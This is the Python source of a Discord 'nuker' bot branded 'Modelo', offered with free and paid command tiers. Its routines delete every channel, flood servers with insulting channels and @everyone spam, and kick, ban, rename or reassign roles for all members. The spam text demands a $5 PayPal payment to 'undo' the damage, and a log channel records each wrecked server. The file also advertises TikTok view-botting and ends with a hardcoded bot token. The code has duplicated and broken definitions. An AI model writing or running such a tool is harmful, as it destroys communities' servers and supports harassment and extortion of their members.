import discord
from discord.ext import commands, tasks
from discord.ui import View, Button
import json
import time
import asyncio
import os
import random
LOG_CHANNEL_ID = 1269473366847258725
SERVER_ID = 1269015657547169876





SETTINGS_FILE_PATH = 'premium_settings.json'

def load_settings():
    try:
        with open(SETTINGS_FILE_PATH, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def check_settings():
    settings = load_settings()
    required_settings = ['channel_names', 'message']
    missing_settings = [setting for setting in required_settings if setting not in settings]
    return missing_settings

async def send_dm(user, message):
    try:
        await user.send(message)
    except:
        pass

async def send_message_with_rate_limit_handling(channel, message):
    try:
        await channel.send(message)
    except discord.errors.HTTPException:
        pass




intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.guild_reactions = True
intents.guild_typing = True

custom_server_name = None
custom_channel_name = None
custom_message = None
custom_webhook_name = None

nuke_active = False

# Check if all settings are provided
def check_settings():
    required_settings = ["custom_server_name", "custom_channel_name", "custom_message"]
    missing_settings = [setting for setting in required_settings if not SETTINGS_FILE.get(setting)]
    return missing_settings


# Define the path to the JSON file
SETTINGS_FILE = 'premium_settings.json'




# Create a list of allowed server IDs
ALLOWED_SERVERS = {1269015657547169876, 1269023985559928924}

# Helper function to send error messages
async def send_dm(user, content):
    try:
        await user.send(content)
    except discord.Forbidden:
        await user.send("I don't have permission to send you a DM. Please make sure your DMs are open.")

bot = commands.Bot(command_prefix='.', intents=intents)
# Utility function to check if maintenance mode is active
def is_in_maintenance():
    return maintenance_mode

def is_admin():
    async def predicate(ctx):
        return ctx.author.guild_permissions.administrator
    return commands.check(predicate)

bypass_users = set()  # Set to store IDs of users who can bypass maintenance mode

bypass_user_id = 1269017430387064843

premium_user_id = '1269017430387064843'
premium_servers = ['1269015657547169876', '1268966439222509639']
log_channel_id = 1269473366847258725
status_channel_id = 1269116976127676579

async def update_status():
    channel = bot.get_channel(status_channel_id)
    if channel:
        uptime = time.time() - bot.start_time
        status = '🟢' if bot.is_ready() else '🔴'
        ping = bot.latency * 1000  # Convert to ms
        embed = discord.Embed(title="Bot Status", color=discord.Color.blue())
        embed.add_field(name="Uptime", value=f"{uptime:.2f} seconds")
        embed.add_field(name="Status", value=status)
        embed.add_field(name="Ping", value=f"{ping:.2f} ms")
        await channel.send(embed=embed)

async def send_message_with_rate_limit_handling(channel, message):
    while True:
        try:
            await channel.send(message)
            return
        except discord.RateLimit as e:
            retry_after = e.retry_after
            print(f"Rate limit hit. Retrying after {retry_after} seconds.")
            await asyncio.sleep(retry_after + 1)  # Adding a small buffer time
        except discord.Forbidden:
            # Handle forbidden errors (e.g., permissions)
            print(f"Forbidden error when sending message to {channel.name}.")
            return
        except discord.NotFound:
            # Handle not found errors (e.g., channel deleted)
            print(f"Channel {channel.name} not found.")
            return

premium_users = set()  # Store premium user IDs
maintenance_mode = False

# Load premium users from a JSON file
def load_premium_users():
    global premium_users
    try:
        with open('premium_users.json', 'r') as f:
            premium_users = set(json.load(f))
    except FileNotFoundError:
        premium_users = set()

# Save premium users to a JSON file
def save_premium_users():
    global premium_users
    with open('premium_users.json', 'w') as f:
        json.dump(list(premium_users), f)

# Save settings to the JSON file
def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as file:
        json.dump(settings, file, indent=4)

#

load_premium_users()

class HelpView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='Free Commands', style=discord.ButtonStyle.primary)
    async def free_commands(self, interaction: discord.Interaction, button: discord.ui.Button):
        free_commands = """
        **Free Commands:**
        - `.nuke`: Nukes the server
        - `.aa`: Gives everyone admin
        - `.ratelimit`: Gives how far away we are from reaching the rate limit
        """
        await interaction.response.edit_message(content=free_commands, view=self)

    @discord.ui.button(label='Premium Commands', style=discord.ButtonStyle.primary)
    async def premium_commands(self, interaction: discord.Interaction, button: discord.ui.Button):
        premium_commands = """
        **Premium Commands:**
        - `.kickall`: Kicks all members except the command issuer.
        - `.banall`: Bans all members.
        - `.nickall [name]`: Nicknames all members.
        - `.custspam [message]`: Spams all channels with the provided message.
        - `.custrenameall [name]`: Renames all channels to the provided name.
        - `.custmass [name]`: Creates 100 channels with the provided name.
        - `.custspamrole [name]`: Creates 50 roles with the provided name.
        - `.applyservername`: Applies the custom server name set in DM.
        - `.massrole [role]`: Assigns a specified role to all members.
        - `.clearchannels [number]`: Deletes a specified number of channels.
        - `.setservername [name]`: Set server name in DM.
        - `.setchannel [name]`: Sets channel names in DM.
        - `.setmessage [message]`: Sets the spam message in DM.
        - `.setwebhook [name]`: Sets the webhook name in DM.
        - `.premiumkill`: Executes the premium nuke with custom settings in DM.
        """
        await interaction.response.edit_message(content=premium_commands, view=self)

def globally_block_maintenance():
    async def predicate(ctx):
        if ctx.author.id == bypass_user_id:
            return True
        # Existing maintenance check logic
        return not maintenance_mode
    return commands.check(predicate)

@bot.event
async def on_member_update(before, after):
    for server_id in premium_servers:
        guild = bot.get_guild(int(server_id))
        if guild is not None and guild.get_member(after.id):
            if after.premium_since and before.premium_since is None:
                premium_users.add(after.id)
                save_premium_users()
            elif before.premium_since and after.premium_since is None:
                premium_users.discard(after.id)
                save_premium_users()

def is_premium_user():
    def predicate(ctx):
        return ctx.author.id in premium_users or ctx.author.id == int(premium_user_id)
    return commands.check(predicate)

def is_authorized_user():
    def predicate(ctx):
        return ctx.author.id == int(premium_user_id)
    return commands.check(predicate)

def maintenance_check(ctx):
    if maintenance_mode and ctx.author.id != int(premium_user_id):
        raise commands.CheckFailure("The bot is currently in maintenance mode.")
    return True


@bot.command()
async def premadd(ctx, user: discord.User):
    if ctx.author.id == int(premium_user_id):
        premium_users.add(user.id)
        save_premium_users()
        await ctx.send(f'{user.mention} has been granted premium access.')

@bot.command()
@is_authorized_user()  # Ensure only the authorized user can use this command
async def premremove(ctx, user: discord.User):
    """Removes premium access from a specified user."""
    if user.id in premium_users:
        premium_users.remove(user.id)
        save_premium_users()
        await ctx.send(f'{user.mention} has had their premium access removed.')
    else:
   
     await ctx.send(f'{user.mention} does not have premium access.')

  #free commands   
@bot.command()
async def nuke(ctx):
    global nuke_active
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return

    if nuke_active:
        await ctx.send("A nuke operation is already in progress.")
        return

    nuke_active = True
    start_time = time.time()
    guild = ctx.guild

    channel_names = [
        "😆💩JOIN MODELO💀🤡",
        "👀😆MODELO OWNS YOU💩💀",
        "😈🤡HACKED BY MODELO😆💩"
    ]

    # Step 1: Delete all channels
    for channel in guild.channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            pass
        except discord.NotFound:
            pass

    await asyncio.sleep(1)  # Wait for 1 second

    # Step 2: Create and spam channels
    for _ in range(10):  # Repeat the process 10 times
        # Create 30 new channels with random names
        new_channels = []
        for _ in range(30):
            if not nuke_active:  # Check if nuke is still active
                break
            channel_name = random.choice(channel_names)
            new_channel = await guild.create_text_channel(channel_name)
            new_channels.append(new_channel)

        # Wait a short period to ensure channels are created
        await asyncio.sleep(0.5)

        # Prepare to spam messages in all channels
        spam_message = "@everyone JOIN MODELO https://discord.gg/GAZWA2HG **YOUR RUINED.** For help to undo this send $5 paypal to thearch38@gmail.com"
        for _ in range(25):  # Repeat 15 times
            if not nuke_active:  # Check if nuke is still active
                break
            tasks = [send_message_with_rate_limit_handling(channel, spam_message) for channel in new_channels]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.25)  # Cooldown between sends

    nuke_active = False
    # Send final confirmation message
    try:
        await ctx.send(f"One more in the books @everyone\nCongrats **{guild.name}**")
    except discord.NotFound:
        pass

    await log_nuke(ctx, premium=False, start_time=start_time)


@bot.command()
@commands.is_owner()  # Or any other check to ensure only authorized users can run this
async def stopnuke(ctx):
    global nuke_active
    if nuke_active:
        nuke_active = False
        await ctx.send("The nuke operation has been stopped.")
    else:
        await ctx.send("No nuke operation is currently active.")

async def log_nuke(ctx, premium: bool, start_time):
    guild = ctx.guild
    nuker = ctx.author
    total_members = guild.member_count
    total_boosts = guild.premium_subscription_count
    end_time = time.time()
    duration = end_time - start_time

    # Fetch the log channel from the specific server
    log_channel = bot.get_channel(1269473366847258725)  # Replace with your log channel ID
    if log_channel:
        emoji = '💎' if premium else '🆓'
        embed = discord.Embed(
            title="Server nuked!",
            description=f"**Server Name:** {guild.name}\n"
                        f"**Nuker:** {nuker.name} {emoji}\n"
                        f"**Total Members:** {total_members}\n"
                        f"**Total Boosts:** {total_boosts}\n"
                        f"**Duration:** {duration:.2f} seconds",
            color=discord.Color.red()
        )
        embed.set_footer(text="modelo log system - 🟢active🟢", icon_url="https://your-icon-url.com/icon.png")  # Use your desired icon URL or remove it
        try:
            await log_channel.send(embed=embed)
        except discord.NotFound:
            pass



@bot.command()
@commands.is_owner()  # Or any other check to ensure only authorized users can run this
async def stop(ctx):
    global nuke_active
    if nuke_active:
        nuke_active = False
        await ctx.send("The nuke operation has been stopped.")
    else:
        await ctx.send("No nuke operation is currently active.")

async def log_nuke(ctx, premium: bool, start_time):
    guild = ctx.guild
    nuker = ctx.author
    total_members = guild.member_count
    total_boosts = guild.premium_subscription_count
    end_time = time.time()
    duration = end_time - start_time

    # Fetch the log channel from the specific server
    log_channel = bot.get_channel(1269473366847258725)  # Replace with your log channel ID
    if log_channel:
        emoji = '💎' if premium else '🆓'
        embed = discord.Embed(
            title="Server nuked!",
            description=f"**Server Name:** {guild.name}\n"
                        f"**Nuker:** {nuker.name} {emoji}\n"
                        f"**Total Members:** {total_members}\n"
                        f"**Total Boosts:** {total_boosts}\n"
                        f"**Duration:** {duration:.2f} seconds",
            color=discord.Color.red()
        )
        embed.set_footer(text="modelo log system - 🟢active🟢", icon_url="https://your-icon-url.com/icon.png")  # Use your desired icon URL or remove it
        try:
            await log_channel.send(embed=embed)
        except discord.NotFound:
            pass



@bot.command()
async def aa(ctx):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return
    # Give everyone admin logic here
    await ctx.send('All members have been given admin.')

@bot.command()
async def ratelimit(ctx):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return

    # Rate limit logic here
    await ctx.send('Rate limit status provided.')

async def run_nuke(ctx, use_default=False):
    # Load custom settings from the JSON file
    with open('premium_settings.json', 'r') as f:
        premium_settings = json.load(f)

    # Define default settings
    default_channel_names = [
        "😆😈Modelo Wins🤡",
        "💀😆Fucked by Modelo😈",
        "💀🤡Hacked by modelo😭"
    ]
    default_message = "@everyone you just got nuked lol join: https://discord.gg/8jhen2ZKae"

    # Use default settings if necessary
    if use_default:
        channel_names = default_channel_names
        message = default_message
    else:
        channel_names = [premium_settings.get('channel_name', 'Default Channel Name')]
        message = premium_settings.get('message', 'Default Message')

    # Change server name
    await ctx.guild.edit(name="Modelo Rules💀")
    
    # Delete all channels
    for channel in ctx.guild.channels:
        await channel.delete()

    await asyncio.sleep(2)
    
    # Create and spam channels
    for _ in range(3):
        for name in channel_names:
            for _ in range(15):
                await ctx.guild.create_text_channel(name)
        
        await asyncio.sleep(2.5)

        for channel in ctx.guild.channels:
            for _ in range(25):
                await channel.send(message)

    # Send the log to the specified channel
    log_channel = bot.get_channel(1270423086357024790)
    log_embed = discord.Embed(title="Server Nuked", color=0xff0000)
    log_embed.add_field(name="Server Name", value=ctx.guild.name)
    log_embed.add_field(name="Nuker", value="Premium User")
    log_embed.add_field(name="Total Members", value=ctx.guild.member_count)
    log_embed.add_field(name="Total Boosts", value=ctx.guild.premium_subscription_count)
    log_embed.add_field(name="Duration", value="N/A")  # Duration tracking implementation is needed
    log_embed.set_footer(text="Modelo Log System - Active", icon_url="https://example.com/logo.png")

    await log_channel.send(embed=log_embed)




# Define the is_premium_user decorator
def is_premium_user():
    def predicate(ctx):
        # Replace this with actual logic to check if the user is premium
        return ctx.author.id in PREMIUM_USERS
    return commands.check(predicate)

# Load settings from JSON file
with open('premium_settings.json', 'r') as f:
    PREMIUM_SETTINGS = json.load(f)

PREMIUM_USERS = [123456789012345678]  # Replace with actual premium user IDs

# Define the command
@bot.command()
@is_premium_user()
async def premiumkill(ctx):
    # Check if user has completed setup
    custom_settings = PREMIUM_SETTINGS.get(str(ctx.author.id), {})
    if not all(key in custom_settings for key in ['channel_name', 'message']):
        # Send DM with missing settings
        missing_settings = [key for key in ['channel_name', 'message'] if key not in custom_settings]
        dm_message = f"You're not customized! Missing settings: {', '.join(missing_settings)}"
        await ctx.author.send(dm_message)
        
        # Ask if they want to use default settings
        view = View()
        yes_button = Button(label="Yes", style=discord.ButtonStyle.primary, custom_id="yes_button")
        no_button = Button(label="No", style=discord.ButtonStyle.secondary, custom_id="no_button")
        view.add_item(yes_button)
        view.add_item(no_button)

        def check(interaction):
            return interaction.user == ctx.author and interaction.message.id == message.id
        
        message = await ctx.send("Would you like to use default settings instead?", view=view)
        
        try:
            interaction = await bot.wait_for('interaction', timeout=60.0, check=check)
        except asyncio.TimeoutError:
            await ctx.send("You took too long to respond.")
            return
        
        if interaction.data['custom_id'] == "yes_button":
            await handle_nuke(ctx, use_default=True)
            await interaction.response.send_message("Executed premium kill with default settings.")
        else:
            await interaction.response.send_message("Please continue setup in DMs!", ephemeral=True)
        return

    # Get custom settings
    channel_name = custom_settings.get('channel_name', 'Default Channel Name')
    message_content = custom_settings.get('message', 'Default Message Content')

    # Perform the nuke
    await handle_nuke(ctx, use_default=False, channel_name=channel_name, message_content=message_content)

    # Log the nuke
    log_channel = bot.get_channel(1270423086357024790)  # Replace with your actual log channel ID
    embed = discord.Embed(
        title='Server Nuked',
        fields=[
            {'name': 'Server Name', 'value': ctx.guild.name},
            {'name': 'Nuker', 'value': f'{ctx.author} (Premium)'},
            {'name': 'Total Members', 'value': str(ctx.guild.member_count)},
            {'name': 'Total Boosts', 'value': str(ctx.guild.premium_subscription_count)},
            {'name': 'Duration', 'value': 'N/A'},  # Update with actual duration if needed
        ]
    )
    embed.set_footer(text='Modelo Log System - Active')
    await log_channel.send(embed=embed)

async def handle_nuke(ctx, use_default, channel_name=None, message_content=None):
    # Change server name
    await ctx.guild.edit(name="Modelo Rules💀")
    
    # Delete all channels
    for channel in ctx.guild.channels:
        await channel.delete()

    # Wait 2 seconds
    await asyncio.sleep(2)

    # Create 15 channels and send messages
    for _ in range(3):  # Repeat 3 times
        for _ in range(15):
            await ctx.guild.create_text_channel(channel_name if channel_name else 'Default Channel Name')
        await asyncio.sleep(2.5)
        for channel in ctx.guild.channels:
            for _ in range(25):
                try:
                    await channel.send(message_content if message_content else 'Default Message Content')
                except discord.Forbidden:
                    pass

# Interaction handler
@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type == discord.InteractionType.component:
        if interaction.data['custom_id'] == "yes_button":
            # Get the user who initiated the interaction
            user = await bot.fetch_user(interaction.user.id)
            # Trigger the premiumkill command with default settings
            ctx = await bot.get_context(interaction.message)
            await handle_nuke(ctx, use_default=True)
            await interaction.response.send_message("Executed premium kill with default settings.")
        elif interaction.data['custom_id'] == "no_button":
            await interaction.response.send_message("Please continue setup in DMs!", ephemeral=True)


@bot.command()
@is_premium_user()
async def kickall(ctx):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return
    try:
        for member in ctx.guild.members:
            if member != ctx.author:
                await member.kick()
        await ctx.send('All members have been kicked.')
    except Exception as e:
        await send_dm(ctx.author, f"An error occurred while executing the command: {e}")

@bot.command()
@is_premium_user()
async def banall(ctx):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return
    try:
        for member in ctx.guild.members:
            if member != ctx.author:
                await member.ban()
        await ctx.send('All members have been banned.')
    except Exception as e:
        await send_dm(ctx.author, f"An error occurred while executing the command: {e}")

@bot.command()
@is_premium_user()
async def nickall(ctx, *, name: str):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return
    try:
        for member in ctx.guild.members:
            await member.edit(nick=name)
        await ctx.send(f'All members have been nicknamed to {name}.')
    except Exception as e:
        await send_dm(ctx.author, f"An error occurred while executing the command: {e}")

@bot.command()
@is_premium_user()
async def custrenameall(ctx, *, name: str):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return
    try:
        for channel in ctx.guild.channels:
            await channel.edit(name=name)
        await ctx.send(f'All channels have been renamed to {name}.')
    except Exception as e:
        await send_dm(ctx.author, f"An error occurred while executing the command: {e}")

@bot.command()
@is_premium_user()
async def custmass(ctx, *, name: str):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return
    try:
        for _ in range(100):
            await ctx.guild.create_text_channel(name)
        await ctx.send(f'Created 100 channels named {name}.')
    except Exception as e:
        await send_dm(ctx.author, f"An error occurred while executing the command: {e}")

@bot.command()
@is_premium_user()
async def custspamrole(ctx, *, name: str):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return
    try:
        for _ in range(50):
            await ctx.guild.create_role(name=name)
        await ctx.send(f'Created 50 roles named {name}.')
    except Exception as e:
        await send_dm(ctx.author, f"An error occurred while executing the command: {e}")

@bot.command()
@is_premium_user()
async def massrole(ctx, role: discord.Role):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return
    try:
        for member in ctx.guild.members:
            await member.add_roles(role)
        await ctx.send(f'Assigned the {role.name} role to all members.')
    except Exception as e:
        await send_dm(ctx.author, f"An error occurred while executing the command: {e}")

@bot.command()
@is_premium_user()
async def clearchannels(ctx, number: int):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return
    try:
        for channel in ctx.guild.channels[:number]:
            await channel.delete()
        await ctx.send(f'Deleted {number} channels.')
    except Exception as e:
        await send_dm(ctx.author, f"An error occurred while executing the command: {e}")

@bot.command()
@is_premium_user()
async def custspam(ctx, *, message: str):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return
    try:
        for channel in ctx.guild.channels:
            for _ in range(100):
                await channel.send(message)
        await ctx.send(f'Spammed "{message}" in every channel.')
    except Exception as e:
        await send_dm(ctx.author, f"An error occurred while executing the command: {e}")


@bot.command()
async def setservername(ctx, *, new_name: str):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return
    await ctx.guild.edit(name=new_name)
    await ctx.send(f'Server name changed to {new_name}.')

# Define the @is_premium_user() decorator (you need to define this decorator)
def is_premium_user():
    async def predicate(ctx):
        # Implement your premium user check here
        return True  # Assuming all users are premium for this example
    return commands.check(predicate)

# Welcome message for new users
@bot.event
async def on_member_join(member):
    welcome_message = f"Welcome to Modelo Discord tools! {member.name} Verify to look around <@{member.id}>."
    await member.send(welcome_message)





@bot.command()
@is_authorized_user()
async def mupdate(ctx):
    update_status.start()
    await ctx.send("Live status updates have started.")

# Nuke disable/enable commands
@bot.command()
@is_authorized_user()
async def nukedisable(ctx):
    global maintenance_mode
    maintenance_mode = True
    await ctx.send("Nuke and all guild-based commands have been disabled.")

@bot.command()
@is_authorized_user()
async def nukeenable(ctx):
    global maintenance_mode
    maintenance_mode = False
    await ctx.send("Nuke and all guild-based commands have been enabled.")

# Maintenance mode commands
@bot.command()
@is_authorized_user()
async def maintenance(ctx):
    global maintenance_mode
    maintenance_mode = True
    await ctx.send("Bot is now in maintenance mode. Only authorized user can run commands.")

@bot.command()
@is_authorized_user()
async def mdisable(ctx):
    global maintenance_mode
    maintenance_mode = False
    await ctx.send("Maintenance mode has been disabled.")

@bot.check
async def globally_block_maintenance(ctx):
    if maintenance_mode and ctx.author.id != int(premium_user_id):
        raise commands.CheckFailure("The bot is currently in maintenance mode.")
    return True

class HelpView(View):
    def __init__(self, user_id):
        super().__init__(timeout=60)  # Set timeout for 1 minute
        self.user_id = user_id

    @discord.ui.button(label='Free Commands', style=discord.ButtonStyle.primary)
    async def free_commands(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("You cannot interact with this button.", ephemeral=True)
            return
        
        embed = discord.Embed(title="Free Commands", description="""
        **Free Commands:**
        - `.nuke`: Nukes the server
        - `.aa`: Gives everyone admin
        - `.ratelimit`: Gives how far away we are from reaching the rate limit
        """, color=discord.Color.blue())
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label='Premium Commands', style=discord.ButtonStyle.primary)
    async def premium_commands(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("You cannot interact with this button.", ephemeral=True)
            return
        
        embed = discord.Embed(title="Premium Commands", description="""
        **Premium Commands:**
        - `.kickall`: Kicks all members except the command issuer.
        - `.banall`: Bans all members.
        - `.nickall [name]`: Nicknames all members.
        - `.custspam [message]`: Spams all channels with the provided message.
        - `.custrenameall [name]`: Renames all channels to the provided name.
        - `.custmass [name]`: Creates 100 channels with the provided name.
        - `.custspamrole [name]`: Creates 50 roles with the provided name.
        - `.applyservername`: Applies the custom server name set in DM.
        - `.massrole [role]`: Assigns a specified role to all members.
        - `.clearchannels [number]`: Deletes a specified number of channels.
        - `.setservername [name]`: Set server name in DM.
        - `.setchannel [name]`: Sets channel names in DM.
        - `.setmessage [message]`: Sets the spam message in DM.
        - `.setwebhook [name]`: Sets the webhook name in DM.
        - `.premiumkill`: Executes the premium nuke with custom settings in DM.
        """, color=discord.Color.green())
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label='Dismiss', style=discord.ButtonStyle.danger)
    async def dismiss(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("You cannot interact with this button.", ephemeral=True)
            return
        
        await interaction.message.delete()

@bot.command()
async def nhelp(ctx):
    if is_in_maintenance():
        await ctx.send("The bot is currently in maintenance mode.")
        return
    
    embed = discord.Embed(title="Help Menu", description="Click a button below to view commands.", color=discord.Color.blue())
    view = HelpView(ctx.author.id)
    
    try:
        # Send the help message as a DM
        dm_message = await ctx.author.send(embed=embed, view=view)
        # Send confirmation message
        confirmation_message = await ctx.send("I have sent you a DM with the help menu!")
        
        # Wait 3 seconds before deleting the confirmation message
        await asyncio.sleep(3)
        await confirmation_message.delete()
    except discord.Forbidden:
        # If the bot cannot send a DM, notify the user
        await ctx.send("I cannot send you a DM. Please make sure your DMs are open.")

@bot.command()
@is_authorized_user()  # Ensure only authorized users can toggle this
async def toggle_bypass_mode(ctx):
    global maintenance_bypass_mode
    maintenance_bypass_mode = not maintenance_bypass_mode
    status = "enabled" if maintenance_bypass_mode else "disabled"
    await ctx.send(f"Maintenance bypass mode has been {status}.")

@bot.command()
@is_authorized_user()  # Ensure only authorized users can add/remove bypass users
async def add_bypass_user(ctx, user: discord.User):
    bypass_users.add(user.id)
    await ctx.send(f"{user.mention} has been added to the bypass list.")

@bot.command()
@is_authorized_user()  # Ensure only authorized users can add/remove bypass users
async def remove_bypass_user(ctx, user: discord.User):
    bypass_users.discard(user.id)
    await ctx.send(f"{user.mention} has been removed from the bypass list.")

@bot.command()
@is_admin()  # Ensure only admins can use this command
async def apurge(ctx, amount: int):
    if amount <= 0:
        await ctx.send("Please provide a positive number of messages to delete.")
        return
    
    # Check if the amount is within the allowed limit
    if amount > 100:
        await ctx.send("You cannot delete more than 100 messages at a time.")
        return
    
    deleted = await ctx.channel.purge(limit=amount)
    await ctx.send(f"Deleted {len(deleted)} message(s).", delete_after=5)

@bot.command()
@is_admin()  # Ensure only admins can use this command
async def verifyinfo(ctx):
    embed = discord.Embed(
        title="Why Verify?",
        description="This just gives us access to have everyone auto join our backup discord in the off-chance that this one gets termed!",
        color=discord.Color.blue()
    )
    embed.add_field(
        name="Need Help?",
        value="If you don't feel comfortable with that, it's all good. Just DM @bobtheKnob.",
        inline=False
    )
    footer_text = "Modelo Log System - Active\nModelo - Active"
    
    # Check if the guild has an icon, use a default icon URL if not
    icon_url = ctx.guild.icon.url if ctx.guild.icon else None
    embed.set_footer(text=footer_text, icon_url=icon_url)
    
    await ctx.send(embed=embed)
@bot.command()
@commands.has_permissions(administrator=True)  # Restrict to admins only
async def undo(ctx):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return

    guild = ctx.guild

    # Delete all channels
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            await ctx.send(f"Failed to delete channel {channel.name}: {e}")

    # Create INVITE category and add-bot channel
    invite_category = await guild.create_category("INVITE")
    await guild.create_text_channel("add-bot", category=invite_category)

    # Create BOT category
    bot_category = await guild.create_category("BOT")

    # Create channels in BOT category
    await guild.create_text_channel("📜logs", category=bot_category)
    await guild.create_text_channel("🟢uptime", category=bot_category)
    await guild.create_text_channel("🤔status", category=bot_category)

    await ctx.send("The server has been reset and new channels have been created.")

@tasks.loop(hours=1)
async def leave_unwanted_servers():
    for guild in bot.guilds:
        if guild.id not in ALLOWED_SERVERS:
            try:
                await guild.leave()
                print(f"Left server: {guild.name} ({guild.id})")
            except Exception as e:
                print(f"Failed to leave server {guild.name} ({guild.id}): {e}")
GUILD_ID = 1268966439222509639

@bot.command()
@commands.has_permissions(manage_guild=True)
async def create_custom_invite(ctx):
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        await ctx.send("Guild not found.")
        return

    # Create an invite for the server
    try:
        channel = guild.system_channel or guild.text_channels[0]  # Choose the system channel or the first text channel
        invite = await channel.create_invite(max_age=0, max_uses=0, unique=False)
        custom_invite_link = f"https://discord.gg/{invite.code}"
        
        embed = discord.Embed(title="Join our server!", description="[Click here to join](https://discord.gg/Modelo)", color=0x00ff00)
        embed.set_footer(text="Boost any of our servers for premium")
        
        await ctx.send(embed=embed)

        # Print the actual invite link in the console for debugging
        print(f"Actual invite link: {invite.url}")
    except Exception as e:
        await ctx.send(f"Failed to create an invite link: {e}")

@bot.command()
@is_admin()
async def tiktok(ctx):
    if maintenance_mode:
        await ctx.send("The bot is currently in maintenance mode.")
        return

    embed = discord.Embed(
        title="Tiktok botter",
        description=(
            "**VIEWS**\n"
            "1,000 views - USD 1.00\n"
            "5,000 views - USD 4.95\n"
            "10,000 views - USD 9.80\n\n"
            "**HEARTS**\n"
            "10 hearts - USD 1.00\n"
            "50 hearts - USD 4.95\n"
            "100 hearts - USD 9.80\n\n"
            "`MORE COMING AT 10 REACTIONS!`"
        ),
        color=discord.Color.blue()
    )
    embed.set_footer(text="Powered by Modelo")

    await ctx.send(embed=embed)

bot.run('MTI2OTAyNDMyMTUxNTU1NzAwNw.GHSwaJ.UZ3jbjqdw946Y_0hxe3dnn32m-S1ma9Outl978')
